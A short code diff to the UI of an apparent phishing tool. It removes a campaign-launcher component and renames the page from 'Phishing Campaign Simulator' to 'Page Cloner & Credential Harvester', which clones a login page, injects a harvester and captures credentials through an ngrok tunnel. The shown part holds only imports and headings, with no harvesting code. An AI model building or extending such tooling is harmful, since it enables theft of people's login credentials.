@@ -20,7 +20,6 @@ import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Textarea } from '@/components/ui/textarea';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
 import { startNgrokTunnel } from '@/services/ngrok-service';
-import { PhishingCampaignLauncher } from '@/components/phishing-campaign-launcher';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -276,12 +275,10 @@ export default function PhishingPage() {
   return (
     <div className="flex flex-col gap-6">
       <div>
-        <h1 className="font-headline text-3xl font-semibold">Phishing Campaign Simulator</h1>
-        <p className="text-muted-foreground">Clone login pages, run campaigns, and manage credential harvesting.</p>
+        <h1 className="font-headline text-3xl font-semibold">Page Cloner & Credential Harvester</h1>
+        <p className="text-muted-foreground">Clone a login page, inject a harvester, and capture credentials in real-time.</p>
       </div>
 
-      <PhishingCampaignLauncher />
-      
       <div className="grid lg:grid-cols-2 gap-6 items-start">
         <div className="flex flex-col gap-6">
             <Card>
